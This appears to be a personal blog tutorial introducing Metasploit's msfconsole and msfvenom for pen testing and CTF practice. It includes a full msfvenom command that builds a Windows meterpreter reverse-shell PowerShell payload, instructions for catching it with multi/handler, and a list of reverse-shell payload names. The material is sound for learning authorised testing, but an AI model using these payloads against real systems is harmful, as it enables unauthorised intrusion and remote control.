---
layout: page
title: The Metasploit Framework
subtitle: Msfconsole and Msfvenom
image: /assets/fe.ico
description: Brief overview of Metasploit, and its tools msfconsole and msfvenom
permalink: /tipsandtricks/metasploit/
---

# Introduction
So what is Metasploit - it's a framework used to find and exploit vulnerabilities on a network, which makes it a great tool for pen testing. That is a very brief (and reductive) summary, you can find more about them on their website <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">here</a>. The two ways you'll likely use this framework is through `msfconsole` and `msfvenom`, both of which can be accessed from the terminal.
<br><br>
The first of those, `msfconsole`, is used to find and run known exploits, as well as handle the payloads that are generated from `msfvenom`. And, well, `msfvenom` is what was just described - it is used to craft payloads for specific types of operating systems that  can then be used.
<br><br><br>

# Msfconsole
This is often used in conjuction with searching exploit-db or more easily using the `searchsploit` tool. Both of these tools will return a list of any known vulnerabilities associated with a service, OS and/or its version. For instance, an old CTF I did called something like "Tom Ghost" I think had an old Apache Tomcat version. From there, I used `searchsploit` to identify the exploit and then `msfconsole` to actually run it. Another time at work I identified a known vulnerability with a Cisco switch running an outdated service using an auxiliary scanner (...with permission, I should probably mention that). Even though I could not exploit it with Metasploit directly and had to do it manually, it was still able to identify there was a vulnerability there. I hope this gives you an idea of what it can be used for.
<br><br>
For the commands within msfconsole I would reference their notes directly using `help` within the console. The fundamental commands you will use will be `search` to locate exploits, auxiliary scanners and more, `use #` for the exploit, configure it with `options` and `set x z`, before ultimately using `exploit` to run the script.
<br><br>
If you're looking to really dive into this the best way is to actually go and do it - get on HTB or TryHackMe and find a CTF that uses the Metasploit framework. It makes infinitely more sense doing it yourself, and reading about it will not get you very far. Besides, I'm a stranger on the internet and for all you know I'm lying to you.
<br><br>
If you want to see how this tool is used in a CTF I did a write-up on a while back, I will link that [here](/thm/2022/04/18/TomGhost.html).
<br><br><br>

# Msfvenom
As previously mentioned, msfvenom can be used to craft targeted payloads for a given system. These payloads are very customizable - you choose the OS, the file type (example .exe, .ps1, etc), and much more.
<br><br>
That command for a Windows machine as a powershell script might look something like `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.38 LPORT=4444 -f ps1 -o reverse_test.ps1`. So long as you can get these payloads onto the target machine and can execute them, you should recieve that reverse shell within msfconsole using their `multi/handler` exploit. Set the payload type to whatever you used in the msfvenom command and the listener should light right up when executed on the other side.
<br><br>
To look at all the flags that can be used with this tool use the typical `msfvenom --help` command for the full list.
<br><br><br>

# Default Reverse Shell List
To make the beginning easy for you, below is a list of some default (auto selected) reverse shell payloads that can be crafted with `msfvenom` and recieved with `msfconsole`. Full disclosure on the following list - I did not put this together, I got it from another site probably a year back and I can't remember which one it was, but I _think_ it was <a href="https://docs.rapid7.com/metasploit/working-with-payloads/" target="_blank" rel="noopener noreferrer">this one</a>. Trying to give credit where it's due. Anyway, this is a good place to start, but for the ENTIRE list of payloads (it's a lot) you can use `msfvenom -l payloads` and then sift through them yourself manually or grep for keywords. Here's that list:<br>
```
windows/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
php/meterpreter_reverse_tcp
ruby/shell_reverse_tcp
cmd/unix/interact
cmd/unix/reverse
cmd/unix/reverse_perl
cmd/unix/reverse_netcat_gaping
windows/meterpreter/reverse_nonx_tcp
windows/meterpreter/reverse_ord_tcp
windows/shell/reverse_tcp
generic/shell_reverse_tcp
```
<br>

# Final Thoughts
Open source tools and frameworks like Metasploit and nmap are critical to learn and become proficient in. Paid for tools have their benefits, no doubt about that, but gaining experience with these free tools really expands your capabilities when pentesting. I'm actually working on a write-up right now for work since I recently got permission to go after some of the network devices we have there. Using nmap and msfconsole I have been able to compromise 4 completely distinct devices using just those two tools, it just takes some experience and knowing how to search for information and test your theories. I'm hoping to get permission to post that up here (once all the vulnerabilities have been patched) since it was a great learning experience and I'd like to share a real world example instead of another CTF. Point being, get started on one of those sites I mentioned in the beginning of this page and you'll enjoy the challenge, I promise.
<br><br>
Cheers.
<br>
